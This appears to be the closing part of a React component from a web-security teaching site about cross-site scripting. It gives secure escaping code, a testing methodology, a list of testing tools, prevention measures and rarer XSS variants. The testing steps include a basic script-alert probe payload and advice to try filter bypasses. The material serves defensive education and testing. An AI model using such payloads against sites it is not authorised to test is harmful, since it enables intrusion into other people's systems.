// This renders userComment as HTML without sanitization`} />
          
          <CodeExample language="javascript" isVulnerable={false} title="Secure Implementation" code={`// Using safe methods to add text content
document.getElementById("output").textContent = 
  "Search results for: " + userInput;

// Or properly escaping HTML on the server side
const escapeHtml = (unsafe) => {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};

// Safe server-side rendering (PHP)
<?php
echo '<div>Welcome, ' . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . '!</div>';
?>

// Safe React component using proper encoding
function Comment({ userComment }) {
  // userComment is automatically encoded when used as text content
  return <div>{userComment}</div>;
}

// Additional protections:
// 1. Implement Content-Security-Policy headers
// 2. Use frameworks that escape output by default (React, Vue, Angular)
// 3. Apply input validation with allowlists
// 4. Use HttpOnly cookies to prevent JavaScript access to sensitive cookies
// 5. Use X-XSS-Protection header for older browsers`} />
        </div>
        
        {/* Step-by-Step Detection */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Step-by-Step XSS Testing Methodology</h4>
          <ol className="list-decimal pl-6 space-y-2 mb-4">
            <li><strong>Identify Entry Points:</strong> Map all user input points (parameters, headers, form fields)</li>
            <li><strong>Test Simple Payloads:</strong> Try basic payloads like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
            <li><strong>Analyze Responses:</strong> Check if input is reflected and how it's encoded/filtered</li>
            <li><strong>Test Context-Specific Payloads:</strong> Craft payloads based on where input is inserted (HTML, JavaScript, attribute)</li>
            <li><strong>Try Filter Bypasses:</strong> If filters are detected, try various evasion techniques</li>
            <li><strong>Test for DOM-based XSS:</strong> Check client-side JavaScript that manipulates DOM with user input</li>
            <li><strong>Test for Stored XSS:</strong> Insert payloads in stored content and verify if it executes when accessed later</li>
            <li><strong>Verify Impact:</strong> Demonstrate the real-world impact (cookie theft, etc.) with non-destructive proof-of-concept</li>
          </ol>
        </div>
        
        {/* Helpful Tools */}
        <div>
          <h4 className="text-xl font-semibold mb-4">XSS Testing Tools</h4>
          <ul className="list-disc pl-6 space-y-2 mb-4">
            <li><strong>Burp Suite:</strong> Proxy tool with built-in XSS scanner and manual testing capabilities</li>
            <li><strong>OWASP ZAP:</strong> Free alternative to Burp with active and passive XSS scanning</li>
            <li><strong>XSS Hunter:</strong> Specialized platform for identifying blind XSS vulnerabilities</li>
            <li><strong>BeEF (Browser Exploitation Framework):</strong> Advanced tool for demonstrating XSS impact</li>
            <li><strong>DOMPurify:</strong> Client-side sanitization library to test if your protection is adequate</li>
            <li><strong>XSSer:</strong> Command-line tool for detecting and exploiting XSS vulnerabilities</li>
            <li><strong>Browser Developer Tools:</strong> For analyzing DOM changes and JavaScript execution</li>
          </ul>
        </div>
        
        {/* Prevention Techniques */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Comprehensive Prevention Techniques</h4>
          <Tabs defaultValue="input">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="input">Input Handling</TabsTrigger>
              <TabsTrigger value="output">Output Encoding</TabsTrigger>
              <TabsTrigger value="headers">Security Headers</TabsTrigger>
            </TabsList>
            <TabsContent value="input" className="mt-4">
              <ul className="list-disc pl-6 space-y-2">
                <li><strong>Input Validation:</strong> Validate input against strict schemas (whitelisting)</li>
                <li><strong>Content-Type Validation:</strong> Ensure input meets expected format (numbers, dates, etc.)</li>
                <li><strong>Reject Known Bad Input:</strong> Block input containing JavaScript or HTML tags when not needed</li>
                <li><strong>Sanitization:</strong> Use libraries like DOMPurify to clean HTML when rich content is required</li>
                <li><strong>Maximum Length Enforcement:</strong> Limit input length to reduce attack surface</li>
              </ul>
            </TabsContent>
            
            <TabsContent value="output" className="mt-4">
              <ul className="list-disc pl-6 space-y-2">
                <li><strong>Context-Specific Encoding:</strong> Use the right encoding for where data is being used (HTML, JS, URLs, CSS)</li>
                <li><strong>HTML Escaping:</strong> Convert &lt;, &gt;, &quot;, &#x27;, and &amp; to their HTML entity equivalents</li>
                <li><strong>JavaScript Escaping:</strong> Use proper encoding for data used in JavaScript contexts</li>
                <li><strong>Use Safe APIs:</strong> Prefer methods like <code>textContent</code> over <code>innerHTML</code></li>
                <li><strong>Template Systems:</strong> Use auto-escaping template engines (React, Vue, Angular, EJS, etc.)</li>
              </ul>
            </TabsContent>
            
            <TabsContent value="headers" className="mt-4">
              <ul className="list-disc pl-6 space-y-2">
                <li><strong>Content-Security-Policy (CSP):</strong> Restrict sources of executable scripts and other resources</li>
                <li><strong>X-XSS-Protection:</strong> Enable browser's built-in XSS filters (legacy browsers)</li>
                <li><strong>X-Content-Type-Options:</strong> Prevent MIME-sniffing attacks with <code>nosniff</code></li>
                <li><strong>HttpOnly Cookies:</strong> Prevent JavaScript from accessing cookies</li>
                <li><strong>SameSite Cookies:</strong> Restrict cookie transmission to same-site requests</li>
              </ul>
            </TabsContent>
          </Tabs>
        </div>
        
        {/* Development Environment Considerations */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Development Environment Considerations</h4>
          <div className="space-y-3">
            <div className="p-4 border border-gray-200 dark:border-gray-700 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">Frontend Frameworks</h5>
              <p className="text-sm">Modern frameworks like React, Vue, and Angular provide built-in XSS protection by automatically escaping content, but can be bypassed when using unsafe methods like <code>dangerouslySetInnerHTML</code> (React), <code>v-html</code> (Vue), or <code>bypassSecurityTrustHtml</code> (Angular). Always avoid these methods unless absolutely necessary and sanitize input first.</p>
            </div>
            
            <div className="p-4 border border-gray-200 dark:border-gray-700 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">Template Engines</h5>
              <p className="text-sm">Server-side template engines like EJS, Handlebars, or Jinja2 may have different default behaviors for escaping. Some automatically escape output while others require explicit escaping. Always verify the security features of your template engine and test thoroughly.</p>
            </div>
            
            <div className="p-4 border border-gray-200 dark:border-gray-700 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">AJAX and API Endpoints</h5>
              <p className="text-sm">JSON APIs can be vulnerable to XSS if responses containing untrusted data are parsed and inserted into the DOM. Set proper <code>Content-Type</code> headers (application/json) and validate input server-side regardless of client-side validation.</p>
            </div>
            
            <div className="p-4 border border-gray-200 dark:border-gray-700 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">User-Generated Content</h5>
              <p className="text-sm">When allowing rich HTML content (blogs, forums), use libraries like DOMPurify to sanitize HTML, restrict allowed tags and attributes to a safe subset, and consider using markdown instead of raw HTML.</p>
            </div>
          </div>
        </div>
        
        {/* Special Cases */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Special XSS Cases and Edge Scenarios</h4>
          <div className="space-y-3">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Blind XSS</h5>
              <p className="text-sm">Vulnerabilities that only trigger in specific contexts not immediately visible to the attacker, such as admin panels, logs, or support tickets. Use tools like XSS Hunter to detect these by including callbacks in payloads.</p>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Self-XSS</h5>
              <p className="text-sm">Requires the victim to paste malicious code into their browser. While not directly exploitable by attackers, it can be combined with social engineering to trick users into executing malicious code against themselves.</p>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">mXSS (Mutation-based XSS)</h5>
              <p className="text-sm">Occurs when seemingly safe HTML is transformed into a malicious form by the browser's parser or DOM manipulation. Often bypasses sanitizers that don't account for browser parsing quirks.</p>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">CSP Bypass Techniques</h5>
              <p className="text-sm">Advanced attacks that circumvent Content-Security-Policy protections through policy misconfigurations, JSONP endpoints, or unsafe-eval usage. Always test CSP configurations thoroughly.</p>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">XSS in Unusual Contexts</h5>
              <p className="text-sm">SVG images, CSS contexts, PDF generation, and other non-traditional HTML contexts can harbor XSS vulnerabilities that require specialized testing and mitigation approaches.</p>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default XSS;
